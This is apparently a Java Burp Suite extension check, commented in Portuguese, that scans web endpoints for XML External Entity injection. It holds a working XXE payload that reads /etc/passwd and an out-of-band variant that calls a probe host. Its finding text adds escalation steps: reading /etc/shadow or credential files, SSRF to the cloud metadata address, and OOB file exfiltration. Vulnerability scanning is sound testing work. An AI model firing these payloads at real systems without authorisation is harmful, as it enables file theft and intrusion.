package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.ScanContext;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * XML External Entity Injection: envia um corpo XML com uma DOCTYPE
 * declarando uma entidade externa apontando para /etc/passwd, pra endpoints
 * que aceitam XML. Se o conteúdo do arquivo voltar na resposta, o parser
 * XML do servidor está processando entidades externas sem restrição.
 *
 * Criado por Rx0 - @rodrigocoutinho91
 */
public class XxeCheck implements VulnCheck {

    private static final String[] PATHS = {"/api/xml", "/api/upload", "/api/import", "/xmlrpc.php", "/api/data", "/"};

    private static final String PAYLOAD_XXE =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE rx0 [ <!ENTITY rx0xxe SYSTEM \"file:///etc/passwd\"> ]>\n" +
            "<root><data>&rx0xxe;</data></root>";

    private static final Pattern ASSINATURA_PASSWD = Pattern.compile("root:.*:0:0:", Pattern.CASE_INSENSITIVE);
    private static final Pattern ASSINATURA_ERRO_XXE = Pattern.compile(
            "DOCTYPE is disallowed|external entit(y|ies)|SAXParseException|XMLStreamException", Pattern.CASE_INSENSITIVE);

    @Override
    public String nome() {
        return "XXE — XML External Entity Injection";
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl) {
        return executar(api, baseUrl, (ScanContext) null);
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
        List<Finding> achados = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        // --- Confirmação OOB via interactsh: entidade externa apontando pro nosso host (XXE-via-SSRF) ---
        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
            for (String path : PATHS) {
                try {
                    String host = ctx.interactsh().criarProbe(
                            "XXE confirmado via interação out-of-band em " + path,
                            Severity.CRITICA,
                            base + path,
                            "O parser XML do endpoint processou uma entidade externa apontando para um domínio único de teste, " +
                                    "e a requisição foi efetivamente recebida — confirmação inequívoca de XXE, mesmo quando o " +
                                    "conteúdo lido não é refletido diretamente na resposta (blind XXE).",
                            "Desabilite DOCTYPE/entidades externas no parser XML, ou use um parser que não suporte DTDs externas por padrão.",
                            "1) Reproduza o payload XML apontando a entidade pro domínio de teste. 2) Como confirmou blind XXE, " +
                                    "use esse mesmo canal pra exfiltrar arquivos: declare uma entidade parameter XML que lê o " +
                                    "arquivo local e o anexa como parte da URL externa requisitada (XXE OOB data exfiltration).");
                    if (host != null) {
                        String payloadOob = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                                "<!DOCTYPE rx0 [ <!ENTITY rx0oob SYSTEM \"http://" + host + "/rx0-xxe-oob-probe\"> ]>\n" +
                                "<root><data>&rx0oob;</data></root>";
                        HttpRequest reqOob = HttpRequest.httpRequestFromUrl(base + path)
                                .withMethod("POST")
                                .withAddedHeader("Content-Type", "application/xml")
                                .withBody(payloadOob);
                        api.http().sendRequest(reqOob);
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de XXE (" + path + "): " + e.getMessage());
                }
            }
        }

        for (String path : PATHS) {
            try {
                String url = base + path;
                HttpRequest req = HttpRequest.httpRequestFromUrl(url)
                        .withMethod("POST")
                        .withAddedHeader("Content-Type", "application/xml")
                        .withBody(PAYLOAD_XXE);
                HttpResponse resp = api.http().sendRequest(req).response();
                if (resp == null) continue;

                String body = resp.bodyToString();
                if (body == null) continue;

                if (ASSINATURA_PASSWD.matcher(body).find()) {
                    achados.add(new Finding(
                            "XXE confirmado em " + path,
                            Severity.CRITICA,
                            url,
                            "O servidor processou a entidade externa declarada no XML e retornou o conteúdo de /etc/passwd na " +
                                    "resposta — confirmação de XML External Entity Injection, que pode permitir leitura de arquivos " +
                                    "arbitrários e, em alguns casos, SSRF ou negação de serviço.",
                            "Payload enviado via Content-Type: application/xml | Conteúdo de /etc/passwd encontrado na resposta.",
                            "Desabilite DOCTYPE/entidades externas no parser XML (ex: setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true) " +
                                    "em Java), ou use um parser que não suporte DTDs externas por padrão.",
                            "1) No Repeater, reenvie o POST pra " + url + " com o Content-Type application/xml e o payload com DOCTYPE. " +
                                    "2) Troque o alvo da entidade pra ler outros arquivos (ex: file:///etc/shadow, ou no Windows C:\\Windows\\win.ini, " +
                                    "ou um arquivo de config da aplicação com credenciais). 3) Para testar SSRF via XXE, troque a entidade por uma " +
                                    "URL interna (ex: SYSTEM \"http://169.254.169.254/latest/meta-data/\"). 4) Para blind XXE (sem retorno direto), " +
                                    "use Out-of-Band XXE via Burp Collaborator como canal externo."));
                } else if (ASSINATURA_ERRO_XXE.matcher(body).find()) {
                    achados.add(new Finding(
                            "Endpoint processa XML com DOCTYPE (XXE não confirmado, requer revisão)",
                            Severity.MEDIA,
                            url,
                            "O servidor retornou um erro relacionado ao processamento de DOCTYPE/entidades externas — o parser " +
                                    "tentou processar a entidade mas algo bloqueou (pode já estar mitigado, ou pode precisar de outro " +
                                    "vetor/payload pra confirmar). Vale uma investigação manual.",
                            "Status: " + resp.statusCode() + " | Mensagem de erro relacionada a DOCTYPE/entidade encontrada.",
                            "Confirme manualmente se o parser está de fato bloqueando entidades externas em todos os caminhos de código."));
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Erro no check de XXE (" + path + "): " + e.getMessage());
            }
        }
        return achados;
    }
}
